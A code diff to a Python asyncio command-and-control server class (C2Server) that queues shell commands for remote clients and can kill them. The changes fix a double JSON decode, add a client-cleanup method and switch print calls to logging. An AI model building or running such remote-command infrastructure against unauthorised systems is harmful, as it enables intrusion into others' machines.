@@ -70,7 +70,7 @@ async def receive_message(reader) -> Dict:
         payload = await asyncio.wait_for(reader.readexactly(length), timeout=30)
         plaintext = json.loads(payload.decode())
         
-        return json.loads(plaintext) if plaintext else None
+        return plaintext if plaintext else None
     except asyncio.TimeoutError:
         logger.warning("Message receive timeout")
         return None
@@ -120,10 +120,25 @@ class C2Server:
         except Exception as e:
             logger.error(f"Client handler error: {e}")
         finally:
-            if client_id and client_id in self.clients:
-                logger.info(f"Client disconnected: {client_id}")
-            if client_state:
+            await self._cleanup_client(client_id, client_state)
+
+    async def _cleanup_client(self, client_id, client_state):
+        try:
+            logger.info(f"Client disconnected: {client_id}")
+            # # Cancel tasks that reference this state (store task refs when created)
+            # for t in client_state.tasks:
+            #     t.cancel()
+            # await asyncio.gather(*client_state.tasks, return_exceptions=True)
+        except Exception as e:
+            logger.exception(f"Error cleaning up client: {e}")
+        finally:
+            try:
                 client_state.writer.close()
+                await client_state.writer.wait_closed()
+            except Exception:
+                logger.exception("Error closing writer")
+            # self.clients.pop(client_id, None)
+
     
     async def _client_loop(self, state: ClientState):
         """
@@ -255,20 +270,20 @@ class C2Server:
         """
         parts = args.split(None, 1)
         if len(parts) < 2:
-            print("Usage: run <client_id> <command>")
+            logger.info("Command too short. Usage: run <client_id> <command>")
             return
         
         client_id, command = parts
         
         if client_id not in self.clients:
-            print(f"Client {client_id} not found")
+            logger.info(f"Client {client_id} not found")
             return
         client_status = self.clients[client_id].status
         if client_status == "killed":
-            print(f"Client {client_id} was killed - not connected")
+            logger.info(f"Client {client_id} was killed - not connected")
             return
         elif client_status != "connected":
-            print(f"Client {client_id} not in connected state ({client_status})")
+            logger.info(f"Client {client_id} not in connected state ({client_status})")
             return
         
         # Queue command
@@ -278,12 +293,12 @@ class C2Server:
             "command": command
         })
         
-        print(f"Command queued for {client_id}: {command}")
+        logger.info(f"Command queued for {client_id}: {command}")
     
     def cmd_kill(self, client_id: str):
         """Kill client connection"""
         if client_id not in self.clients:
-            print(f"Client {client_id} not found")
+            logger.info(f"Client {client_id} not found")
             return
         
         # Send kill command first
@@ -294,7 +309,7 @@ class C2Server:
             "command": "kill"
         })
         
-        print(f"Kill command sent to {client_id}")
+        logger.info(f"Kill command sent to {client_id}")
         client_state.status = "killed"
     
     async def admin_cli(self):
@@ -332,7 +347,7 @@ class C2Server:
                     """)
                 
                 else:
-                    print("Unknown command. Type 'help'")
+                    logger.info("Unknown command. Type 'help'")
             
             except EOFError:
                 break
